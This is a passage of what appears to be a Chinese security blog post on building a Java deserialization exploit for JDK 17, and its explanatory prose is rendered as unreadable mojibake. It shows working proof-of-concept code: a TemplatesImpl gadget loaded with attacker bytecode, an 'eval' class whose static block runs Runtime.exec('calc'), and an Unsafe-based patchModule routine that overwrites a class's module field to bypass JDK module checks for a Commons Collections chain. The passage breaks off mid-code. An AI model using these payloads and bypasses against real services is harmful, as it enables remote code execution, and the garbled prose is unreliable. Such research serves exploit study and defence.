<p>Unsafeæ˜¯ä¸€ä¸ªååº•å±‚çš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯é€šè¿‡æ‰¾åˆ°<code>Fieldçš„åœ°å€</code>ï¼Œç„¶åä¿®æ”¹å…¶æŒ‡å‘æˆ‘ä»¬è®¾ç½®çš„å€¼</p>
<h3 id="templatesimpl-test">TemplatesImpl test<a hidden class="anchor" aria-hidden="true" href="#templatesimpl-test">#</a></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test_17</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">appClassLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">pool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">javassist</span><span class="p">.</span><span class="na">LoaderClassPath</span><span class="p">(</span><span class="n">appClassLoader</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;eval&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazz2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Evil</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz2</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">code</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">aClass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">o</span><span class="p">,</span><span class="s">&#34;_transletIndex&#34;</span><span class="p">,</span><span class="n">0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//setFiled(o,&#34;_auxClasses&#34;,new HashMap&lt;&gt;());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">eval</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">test_17</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">o1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Templates</span><span class="p">)</span><span class="w"> </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o1</span><span class="p">.</span><span class="na">getOutputProperties</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="o">=</span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">ObjectModule</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>demoä¸­åœ¨<code>åå°„å‰</code>æ‰§è¡Œ<code>patchModule(test_17.class,aClass);</code>ä¿®æ”¹æ¨¡å—ï¼Œç„¶åååºåˆ—åŒ–åè°ƒç”¨<code>getOutputProperties</code>è§¦å‘sinkï¼Œç„¶åè¿™é‡Œç”Ÿæˆ<code>binæ–‡ä»¶</code>åï¼Œæ³¨é‡Šæ‰å‰é¢ä»£ç ï¼Œæ‰§è¡Œ<code>readobject</code>æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ã€‚è¿™é‡Œæˆ‘å°±æ„Ÿè§‰å¥½åƒè·Ÿæˆ‘æƒ³çš„æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä¹‹å‰çœ‹é‚£ç¯‡æ–‡ç« ä»¥ä¸ºåªè¦<code>å®ä¾‹åŒ–ç±»</code>å°±ä¼šè¿›è¡Œ<code>æ¨¡å—çš„æ£€æµ‹</code>ã€‚ä½†æ˜¯å¾ˆæ˜¾ç„¶è¿™é‡Œè‚¯å®šæ²¡æœ‰ã€‚</p>
<h1 id="0x03-æ„é€ ">0x03 æ„é€ <a hidden class="anchor" aria-hidden="true" href="#0x03-æ„é€ ">#</a></h1>
<p>ç„¶åå°±å¼€å§‹å°è¯•æ„é€ äº†</p>
<h3 id="1evalclass">1.eval.class<a hidden class="anchor" aria-hidden="true" href="#1evalclass">#</a></h3>
<blockquote>
<p>é¦–å…ˆæ˜¯æ¶æ„ç±»ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰ç»§æ‰¿<code>AbstractTranslet</code>ï¼Œå› ä¸ºæœ‰<code>æ¨¡å—æ£€æµ‹</code>é‚£ä¸ªä¸œè¥¿ï¼Œåæ­£æˆ‘å½“æ—¶å¾ˆå¤šæŠ¥é”™ï¼Œæˆ‘å°±ç›´æ¥åˆ äº†ï¼Œè¿™é‡Œåˆ†æä»£ç å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ä»£æ›¿</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">eval</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">static</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getSuperclass</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">eval</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><strong>å°è¯•</strong></p>
<p>å¼€å§‹å°è¯•è¿‡é‡å†™<code>getSuperclass()</code>æ–¹æ³•ç»•è¿‡ifåˆ¤æ–­ï¼Œåé¢å‘ç°é‡å†™ä¸äº†è¿™ä¸ªï¼ŒåŸå› åº”è¯¥æ˜¯ï¼šè¿™é‡Œ<code>_class[i]</code>å±äº<code>Class</code>å¯¹è±¡ï¼Œç„¶å<code>Classæ˜¯finalä¸è®©ç»§æ‰¿</code>ï¼Œç„¶åä¹Ÿå°±é‡å†™ä¸äº†äº†</p>
<p><img loading="lazy" src="../images/image-20250113094437387.png" alt="image-20250113094437387"  />
</p>
<p><strong>è§£å†³</strong></p>
<p>é‚£ä¹ˆè¿™é‡Œä¼šè¿›å…¥<code>else</code>ï¼Œ<code>_auxClasses</code>æ­£å¸¸æ˜¯<code>null</code>æ‰€ä»¥è¿™é‡Œä¼šç©ºæŒ‡é’ˆæŠ¥é”™ã€‚ä½†æ˜¯è¿™ä¸ªå€¼ä¸èƒ½<code>åå°„è®¾ç½®</code>ï¼Œè¿™ä¸ªå€¼æœ€åè¿˜æ˜¯å±äº<code>Hashtable</code>ï¼Œä½†æ˜¯<code>Hashtable</code>ä¸ç»§æ‰¿<code>Serializable</code>ã€‚é‚£å°±çœ‹é‚£äº›åœ°æ–¹ä¼šå¯¹è¿™ä¸ªå€¼è¿›è¡Œ<code>èµ‹å€¼</code>ï¼Œçœ‹æˆ‘ä»¬èƒ½ä¸èƒ½è°ƒç”¨åˆ°</p>
<p><img loading="lazy" src="../images/image-20250110181447046.png" alt="image-20250110181447046"  />
</p>
<p>å‘ç°å°±åœ¨<code>defineTransletClasses()</code>ä¸Šæ–¹å°±æœ‰ï¼Œåªè¦<code>_bytecodes.length&gt;1</code>å°±è¡Œï¼Œezå¾ˆå¥½æ»¡è¶³</p>
<p><img loading="lazy" src="../images/image-20250110182256807.png" alt="image-20250110182256807"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">,</span><span class="n">code2</span><span class="p">});</span><span class="w">
</span></span></span></code></pre></div><p>è¿™æ ·è®¾ç½®å°±è§£å†³äº†ï¼Œç„¶åä»¥ä¸ºå¥—ä¸€å±‚Unsafeå°±èƒ½å®ç°æ—¶ï¼Œæœ€å¤§çš„é—®é¢˜æ¥äº†</p>
<h2 id="2-boss-newinstance">2. boss newInstance<a hidden class="anchor" aria-hidden="true" href="#2-boss-newinstance">#</a></h2>
<p>åœ¨transformæœ€åè°ƒç”¨ç‚¹ï¼Œ<code>TrAXFilter</code>çš„å®ä¾‹åŒ–æ˜¯é€šè¿‡<code>newInstance</code>å®ç°ï¼Œè€Œè¿™ä¸ªå±äºåå°„ï¼Œè¿™é‡Œä¼šè¿›è¡Œ<code>æ¨¡å—æ£€æµ‹</code>ï¼ï¼ï¼</p>
<p><img loading="lazy" src="../images/image-20250110182815025.png" alt="image-20250110182815025"  />
</p>
<p>èµ·åˆåœ¨pocä¸­å†™å¥<code>patchModule(invokerTransformer.getClass(),aClass);</code>ï¼ˆaClasså°±æ˜¯TrAXFilter.classï¼‰ï¼Œå¯ä»¥æˆåŠŸè°ƒç”¨ï¼Œä½†æ˜¯ä¸‹æ„è¯†å°±ååº”åˆ°è¿™æ˜¯æœ¬åœ°ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ˜¯ä¸€ä½“çš„ã€‚ç›¸å½“äºè¿™ä¸ªä¹Ÿä¿®æ”¹äº†<code>æœåŠ¡ç«¯invokerTransformer</code>çš„æ¨¡å—hhhã€‚</p>
<p>ç„¶åè¿™é‡Œæ²‰æ€äº†ä¸‹ï¼Œèƒ½ä¸èƒ½é€šè¿‡CCé“¾ä¸­<code>Transformer[]</code>çš„æ„é€ æ‰§è¡Œ<code>patchModule()</code>ä¸­çš„ä»£ç ï¼ˆUnsafeé‚£å—ä»£ç ï¼Œä¿®æ”¹æ¨¡å—ï¼‰ï¼Œ<code>ä¿®æ”¹å®Œæ¨¡å—</code>ç„¶åå†è°ƒç”¨CC4åé¢çš„sinkï¼Œç„¶åæ‹¼æ¥åˆ°ä¸€ä¸ª<code>Transformer[]</code>é‡Œé¢è¿›è¡Œåˆ©ç”¨</p>
<p>ç„¶åçœ‹äº†ä¸‹<code>ConstantTransformer</code>ï¼Œå‘ç°è¿”å›çš„å¯¹è±¡ï¼Œå’Œæ¥æ”¶<code>input</code>æ²¡åŠæ¯›é’±å…³ç³»ï¼Œæ‰€ä»¥ä¸Šé¢æƒ³æ³•æ˜¯å¯è¡Œçš„</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">O</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="kd">final</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">iConstant</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="21-æ€ä¹ˆå®ç°unsafe">2.1 æ€ä¹ˆå®ç°Unsafe<a hidden class="anchor" aria-hidden="true" href="#21-æ€ä¹ˆå®ç°unsafe">#</a></h3>
<p>è¯´å¹²å°±å¹²ï¼Œæ…¢ç€ï¼Œä½ æ˜¯è¯´ç”¨<code>invokerTransformer</code>æ¥å®ç°ä¸‹é¢è¿™æ®µä»£ç ï¼Ÿ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
